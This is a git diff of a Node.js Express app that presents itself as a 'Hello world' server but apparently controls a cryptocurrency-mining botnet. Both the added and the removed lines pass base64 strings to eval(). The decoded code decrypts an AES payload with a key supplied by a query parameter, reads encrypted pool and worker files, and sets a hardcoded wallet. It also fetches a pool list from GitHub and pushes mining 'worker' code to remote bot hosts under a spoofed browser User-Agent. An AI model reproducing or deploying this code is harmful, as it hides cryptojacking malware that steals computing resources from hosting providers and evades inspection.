@@ -4,43 +4,37 @@ const request = require('request');
 const CryptoJS = require("crypto-js");
 const express=require('express');
 const app=express();
-app.get('/',function(req,res) { 
-  if(req.query.active) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
+app.get('/',function(req,res) {
+  if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == '1'
+  if(req.query.active) {
+    if(!c.active && !pools.length) {
+      c.active = req.query.active;
+      var glob = function(x) { eval(decrypt(x.substring(-~[c.active.length]))) }
+(`AXZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZSkudG9TdHJpbmcoQ3J5cHRvSlMuZW5jLlV0ZjgpIH07C
+nZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc2hpZnQoKSk7CmMuY29pbiA9IGxpc3Quc2hpZnQoKT
+sgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwpjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsgYy5wZWVycyA9IFtsaXN0LnNoaWZ0KCldOyBjLnBlZXJzLnB1c2gobGlzdC5zaGlmdCgpKTs
+KYy5hY3RpdmUgKz0gMjM0NTsgdmFyIHdvcmtlciA9IGRlY3J5cHQoZnMucmVhZEZpbGVTeW5jKCdzdXBlcmJvdC5qcycsJ3V0ZjgnKSk7CndvcmtlciArPWAKYXBwLmRiPXtzdGF0ZToneWVsbG93Jyxob3N0Omgs
+aGFzaDonMCBoL3MgWzAvMF0nfTsKdmFyIGJvdCA9IG5ldyBzdXBlcmJvdCgpOwp2YXIgdF9oYXNoID0gbF9oYXNoID0gc19oYXNoID0gMDsKYXBwLnBvc3QoJy93b3JrZXInLCBhcHAucGFyc2VyLCBmdW5jdGlvb
+iAocmVxLCByZXMpIHsKICBhcHAuZGIubXNnID0gJ25vdGhpbmcnOwogIHZhciBwcyA9IFtdOwogIGZvcih2YXIgaT0wOyBpPHJlcS5ib2R5LmpvYnMubGVuZ3RoOyBpKyspIHBzLnB1c2goYm90Lm9ubWVzc2FnZS
+hyZXEuYm9keS5qb2JzW2ldKSk7CiAgUHJvbWlzZS5hbGwocHMpLnRoZW4obXNncyA9PiB7CiAgICB0X2hhc2ggKz0gbXNncy5sZW5ndGg7CiAgICBmb3IodmFyIGk9MDsgaTxtc2dzLmxlbmd0aDsgaSsrKSBpZih
+tc2dzW2ldICE9ICdub3RoaW5nJykgewogICAgICBpZihhcHAuZGIubXNnID09ICdub3RoaW5nJykgYXBwLmRiLm1zZyA9IFttc2dzW2ldXQogICAgICBlbHNlIGFwcC5kYi5tc2cucHVzaChtc2dzW2ldKTsKICAg
+ICAgc19oYXNoKys7CiAgICB9CiAgICByZXMuanNvbihhcHAuZGIpOwogIH0pOwp9KTsKc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgYXBwLmRiLnN0YXRlID0gdF9oYXNoID09IGxfaGFzaCA/ICd5ZWxsb3cnI
+DogJ2dyZWVuJzsKICBhcHAuZGIuaGFzaCA9ICh0X2hhc2gtbF9oYXNoKSsnIGgvcyBbJyt0X2hhc2grJy8nK3NfaGFzaCsnXSc7CiAgbF9oYXNoID0gdF9oYXNoOwp9LCAxMDAwKTsKYyhhcHAuZGIpCmA7CmZvci
+h2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspCiAgaWYoIWxpc3RbaV0uc3RhcnRzV2l0aCgnaHR0cCcpKSBwb29scy5wdXNoKG5ldyBteWNvaW4oeyB3YWxsZXQ6IGMud2FsbGV0LCBob3N0OiBsaXN0W2ldIH0
+pKQogIGVsc2UgeyBsZXQgbmJvdD17aG9zdDpsaXN0W2ldLCBzdGF0ZTonb3JhbmdlJywgaGFzaDonMCBoL3MgWzAvMF0nfTsgYm90cy5wdXNoKG5ib3QpOyB3YWtldXAobmJvdCkgfQ==`)
+    }
+    res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
+  }
   else { res.send('Hello world!') }
 });
-var s=app.listen(process.env.PORT||5000,()=>console.log(c.id+' Listening on port '+s.address().port));
+var s=app.listen(process.env.PORT||5000,()=>console.log('Listening on port '+s.address().port));
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
 
-var c = { active: 0, state: 'orange', yellow_pools: false }
+var c = { active: 0, state: 'orange', yellow_pools: false, hash: '0 h/s 0/0' }
 var rec = false;
 
-var pools = []; var bots = [];
-
-var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
-(`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKY
-y5jb2luID0gJ1R1YmUnOwpjLndhbGxldCA9ICdieGNuTHZ5WU5xYUQ0RDZRZEp5ektmY2pKNlFjTUxnTVcyRE1xRVNVcTh4OUpFTTlmQWc2Y2tXRG5hMlhFajJNOEhmQ1A4RXpjYm5TR2JrWUZndmJ6SHZtMlZBT
-jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc
-2hpZnQoKSk7CmMucGVlcnMgPSBbbGlzdC5zaGlmdCgpXTsgYy5wZWVycy5wdXNoKGxpc3Quc2hpZnQoKSk7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpX
-Swgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVwKG5ib3QpIH07CnJlcXVlc3QoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zYnV0Y
-2gvbXlwb29sL21hc3Rlci9wb29scy50eHQnLCBmdW5jdGlvbihlcnIsIHJlcywgYm9keSkgewogIHZhciBsaXN0ID0gZGVjcnlwdChib2R5KS5zcGxpdCgnXHJcbicpOwogIHZhciBteWNvaW4gPSByZXF1aXJlK
-CcuLycrYy5jb2luKycuanMnKTsKICBmb3IodmFyIGk9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKSBwb29scy5wdXNoKG5ldyBteWNvaW4oeyB3YWxsZXQ6IGMud2FsbGV0LCBob3N0OiBsaXN0W2ldIH0pKTsKfSk7`)
-
-var superbot = decrypt(fs.readFileSync('superbot.js','utf8'));
-var worker = superbot+'\n'+decrypt(`
-U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
-GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
-agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
-DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
-ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
-vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
-59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
-
-function mylist(obj) {
-  var result = []
-  for(var i=0; i<obj.length; i++) result.push(obj[i].host+' - '+obj[i].state+' - '+obj[i].hash)
-  return result
-}
+var pools = []; var bots = []; var worker = '';
 
 function wakeup(bot) {
   bot.msg = "wakeup";
@@ -62,13 +56,10 @@ function onmsg(bot) {
   if (!c.active || jobs.length == 0) wakeup(bot)
   else {
     var data = { jobs: jobs };
-    request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
-      function(error, response, body) {
-        if(body && body.toString().includes('Cannot POST'))
-          request.post({url:bot.host,form:{worker:worker},json:true},function(error,response,body){botdb(error,body)})
-        else botdb(error,body,true)
-      }
-    )
+    myrequest(bot.host+'/worker',{jobs:jobs},function(error, response, body){
+      if(body && body.toString().includes('Cannot POST')) myrequest(bot.host,{worker:worker},function(error,response,body){botdb(error,body)})
+      else botdb(error,body,true)
+    })
   }
 
   function botdb(error,body,next) {
@@ -90,14 +81,29 @@ function onmsg(bot) {
   }
 }
 
+function mylist(obj) {
+  var result = {red:[],orange:[],yellow:[],green:[]}
+  for(var i=0; i<obj.length; i++) result[obj[i].state].push(obj[i].host+' - '+obj[i].hash); 
+  for (const [key, value] of Object.entries(result)) { if(!result[key].length) delete result[key] }
+  return result
+}
+
+function myrequest(url,form,callback) {
+  var options = {
+    url:url, method:'GET', json:true,
+    headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geko) Chrome/83.0.4103.116 Safari/537.36'}
+  }
+  if(form) { options.method = 'POST'; options.form = form }
+  request(options, (error, response, body) => callback(error, response, body));
+}
+
 setInterval(function() {
   var m = new Date().getMinutes();
   if(c.id == 1 && m < 30) c.active = m+1
   else if(c.id == 2 && m >= 30) c.active = m-29
   else c.active = 0
-
-  if(!rec && c.active == 1) { rec = true;  request(c.peers[c.id-1], function(err, res, body) { rec = false }) }
-  if(!rec && c.active == 30) { rec = true; request(c.peers[c.id == 1 ? 1 : 0], function(err, res, body) { rec = false }) }
+  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],function(){ rec = false }) }
+  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],function(){ rec = false }) }
 
   //--------------------------------------------------------
 
